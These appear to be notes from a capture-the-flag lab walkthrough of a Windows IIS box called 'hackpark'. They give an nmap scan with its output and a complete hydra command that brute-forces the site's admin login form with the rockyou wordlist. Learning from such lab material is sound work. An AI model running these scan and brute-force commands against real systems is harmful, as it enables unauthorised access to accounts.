##### nmap
```
sudo nmap -sC -sV 10.10.252.236 -oA nmap -v -Pn
```
```
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE POST
|_  Potentially risky methods: TRACE
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2024-08-19T12:10:07+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2024-08-19T12:10:02+00:00
| ssl-cert: Subject: commonName=hackpark
| Issuer: commonName=hackpark
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-08-18T12:07:53
| Not valid after:  2025-02-17T12:07:53
| MD5:   0720:5830:9d4b:31dd:6f20:3272:3ce3:14ba
|_SHA-1: 3aa3:b038:9862:a887:c78a:dc3f:033f:38e3:eadf:5136
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Brute-forced login page http://10.10.252.236/Account/login.aspx?ReturnURL=/admin/
```bash
hydra -l "admin" -P /usr/share/wordlists/rockyou.txt 10.10.252.236 http-post-form "//Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=GduzrhXIgwW2e2a%2FE2vzveXIgCpPFFehznoiDm8jyxEIFgRLGuwyN8Ji8h%2BS6sM1lt5ShLG%2B3L0zFyDMSGdsXNQowWlgQ6pvs3jpdzE0sbq%2Fjd7eZL6yAlOoeYzTYXesALBYXqo8VJWC2%2FwTShXYF8%2B8YMwB2MTcJBTEzq4f75AaDe58&__EVENTVALIDATION=G%2FsdLEzj%2Ffp%2FsObiog1Bey8i0QVviTQjypODwUoBuwaWgW%2BL6el5COAyLjQ%2FsTwnlbkIjXjDQfSFt2ORJLAW5CpmUeDVVaKBoZ7S8nC6Q4iv%2FcEaPSFDoEkxz7VaVMWwN4aemg4tNK%2BcGKoy0JLVvOb6jhvurgu2GkAU5IZYSVykm4j5&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -t 64 -v 
```
![[Pasted image 20240819162119.png]]

